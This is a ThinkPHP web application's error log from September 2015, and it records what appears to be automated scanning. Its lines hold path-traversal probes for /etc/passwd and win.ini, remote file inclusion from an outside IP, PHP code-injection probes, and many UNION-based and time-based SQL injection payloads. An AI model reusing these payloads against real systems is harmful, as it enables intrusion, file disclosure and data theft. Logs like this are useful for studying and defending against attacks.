[ 2015-09-30T15:47:31+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-30T15:50:21+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-30T15:50:25+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-30T15:50:53+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-30T15:50:53+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T15:51:07+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T15:51:16+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-30T15:51:42+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-30T15:52:19+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-30T15:52:25+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-30T21:07:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal",.'"))"))
[ 2015-09-30T21:07:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:07:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:07:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:07:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:08:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:08:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:08:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:08:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:08:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:08:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:08:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:08:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:08:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T21:08:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:08:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:08:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:08:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T21:09:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T21:09:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T21:09:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T21:09:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T21:09:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5)
[ 2015-09-30T21:09:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5) #
[ 2015-09-30T21:09:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT PG_SLEEP(5)--
[ 2015-09-30T21:09:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT SLEEP(5)-- 
[ 2015-09-30T21:09:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)-- 
[ 2015-09-30T21:09:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal) AND SLEEP(5) #
[ 2015-09-30T21:09:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)--
[ 2015-09-30T21:09:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal WAITFOR DELAY '0:0:5'--
[ 2015-09-30T21:10:58+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-30T21:10:58+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-30T21:11:07+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-30T21:11:14+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-30T21:13:08+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-30T21:13:15+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-30T21:13:16+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-30T21:14:12+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T21:14:20+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T21:14:26+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-30T21:14:50+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-30T21:14:57+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-30T21:15:45+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-30T22:53:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal',,[())[]"
[ 2015-09-30T22:54:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
